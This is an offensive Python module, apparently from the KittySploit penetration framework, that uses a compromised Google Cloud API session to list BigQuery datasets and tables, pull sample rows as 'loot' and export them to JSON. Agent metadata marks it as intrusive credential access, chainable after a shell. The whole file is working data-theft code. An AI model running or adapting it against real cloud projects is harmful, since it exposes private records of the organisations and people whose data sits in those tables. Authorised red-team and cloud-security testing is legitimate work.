#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP BigQuery Table Preview Loot",
        "description": "Enumerate BigQuery datasets/tables and preview row samples",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "bigquery", "loot", "data"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 10,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    dataset_id = OptString("", "Specific dataset ID; empty scans all datasets", False)
    table_id = OptString("", "Specific table ID within dataset_id", False)
    max_datasets = OptInteger(10, "Maximum datasets to process", False)
    max_tables = OptInteger(10, "Maximum tables per dataset", False)
    row_limit = OptInteger(10, "Maximum rows to preview per table", False)
    mask_values = OptBool(True, "Mask cell values in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            datasets = self._resolve_datasets(project_id)
            if not datasets:
                print_warning("No BigQuery datasets found")
                return self.module_result(success=True, data={"datasets": []})

            max_datasets = max(1, int(self.max_datasets or 10))
            max_tables = max(1, int(self.max_tables or 10))
            row_limit = max(1, int(self.row_limit or 10))
            loot = []

            print_info(f"Previewing tables from {min(len(datasets), max_datasets)} dataset(s)...")
            for dataset in datasets[:max_datasets]:
                dataset_id = self._dataset_id(dataset)
                print_info(f"Dataset: {dataset_id}")
                tables = self._list_tables(project_id, dataset_id, max_tables)
                dataset_entry = {"dataset": dataset_id, "tables": []}

                for table in tables:
                    table_id = self._table_id(table)
                    preview = self._preview_table(project_id, dataset_id, table_id, row_limit)
                    table_entry = {
                        "table": table_id,
                        "type": table.get("type"),
                        "schema": (preview.get("schema") or table.get("schema")),
                        "numRows": table.get("numRows") or (preview.get("totalRows")),
                        "rows": preview.get("rows") or [],
                        "query_error": preview.get("error"),
                    }
                    dataset_entry["tables"].append(table_entry)
                    print_success(f"  table: {table_id} rows={table_entry.get('numRows', '?')}")
                    if table_entry["rows"]:
                        print_info(f"    preview: {self._render_rows(table_entry['rows'])}")
                    elif table_entry.get("query_error"):
                        print_warning(f"    preview failed: {table_entry['query_error']}")

                loot.append(dataset_entry)
                print_info("-" * 80)

            payload = {"project_id": project_id, "datasets": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} dataset(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"BigQuery table preview loot failed: {exc}")
            return False

    def _resolve_datasets(self, project_id):
        configured_dataset = str(self.dataset_id or "").strip()
        if configured_dataset:
            return [{"datasetReference": {"datasetId": configured_dataset}}]

        body = self._gcp_body_dict("bigquery_datasets")
        return list(body.get("datasets") or [])

    @staticmethod
    def _dataset_id(dataset):
        ref = dataset.get("datasetReference") or {}
        return str(ref.get("datasetId") or dataset.get("id") or "").split(":")[-1]

    @staticmethod
    def _table_id(table):
        ref = table.get("tableReference") or {}
        return str(ref.get("tableId") or table.get("id") or "").split(".")[-1]

    def _list_tables(self, project_id, dataset_id, max_tables):
        configured_table = str(self.table_id or "").strip()
        if configured_table:
            return [{"tableReference": {"tableId": configured_table}}]

        quoted_project = self._quote_project(project_id)
        url = f"https://bigquery.googleapis.com/bigquery/v2/projects/{quoted_project}/datasets/{dataset_id}/tables"
        return self._gcp_paginate_get(url, "tables", max_items=max_tables, params={"maxResults": min(max_tables, 100)})

    def _preview_table(self, project_id, dataset_id, table_id, row_limit):
        query = (
            f"SELECT * FROM `{project_id}.{dataset_id}.{table_id}` "
            f"LIMIT {int(row_limit)}"
        )
        url = f"https://bigquery.googleapis.com/bigquery/v2/projects/{self._quote_project(project_id)}/queries"
        result = self._gcp_post(
            url,
            {
                "query": query,
                "useLegacySql": False,
                "maxResults": int(row_limit),
                "timeoutMs": 30000,
            },
        )
        body = result.get("body")
        if not result.get("ok") or not isinstance(body, dict):
            return {"error": (result.get("raw") or "")[:300]}

        schema = ((body.get("schema") or {}).get("fields") or [])
        rows = []
        for row in body.get("rows") or []:
            values = {}
            cells = row.get("f") or []
            for idx, field in enumerate(schema):
                field_name = field.get("name", f"col_{idx}")
                cell = cells[idx] if idx < len(cells) else {}
                values[field_name] = cell.get("v")
            rows.append(values)

        return {
            "schema": schema,
            "rows": rows,
            "totalRows": body.get("totalRows"),
        }

    def _render_rows(self, rows):
        sample = rows[:3]
        rendered = json.dumps(sample, ensure_ascii=False)
        return self._gcp_mask_value(rendered, mask=self.mask_values)
